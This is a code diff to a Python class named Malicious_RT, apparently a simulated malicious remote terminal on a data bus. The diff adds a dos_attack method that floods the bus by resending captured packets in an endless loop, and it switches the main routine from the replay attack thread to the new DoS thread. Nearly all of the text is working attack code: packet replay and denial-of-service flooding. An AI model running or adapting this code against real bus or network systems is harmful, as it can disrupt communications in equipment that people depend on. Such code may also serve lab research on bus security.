@@ -26,8 +26,8 @@ class Malicious_RT:
         check_flag = 0
         while True:
             time.sleep(10)
-            print("Performing Replay attack")
             if self.captured_packets:
+                print("Performing Replay attack")
                 # for i in self.captured_packets:
                 #    print("Sending ", i)
                 packet_check = self.captured_packets.pop(0)
@@ -43,6 +43,15 @@ class Malicious_RT:
                     if packet_check[:3] == '100':
                         self.captured_packets.insert(0, packet_check)
                     print("Replay of 1 cycle done")
+    
+    def dos_attack(self):
+        if self.captured_packets:
+            print("Performing DoS attack")
+        while True:
+            time.sleep(1)
+            for captured_packet in self.captured_packets:
+                self.send_packet(captured_packet)
+        return
 
     def show_packets(self):
         while True:
@@ -77,5 +86,9 @@ if __name__ == "__main__":
     replay_thread = threading.Thread(
         target=capture_agent.replay_attack
     )
+#    replay_thread.start()
 
-    replay_thread.start()
+    dos_thread = threading.Thread(
+        target=capture_agent.dos_attack
+    )
+    dos_thread.start()
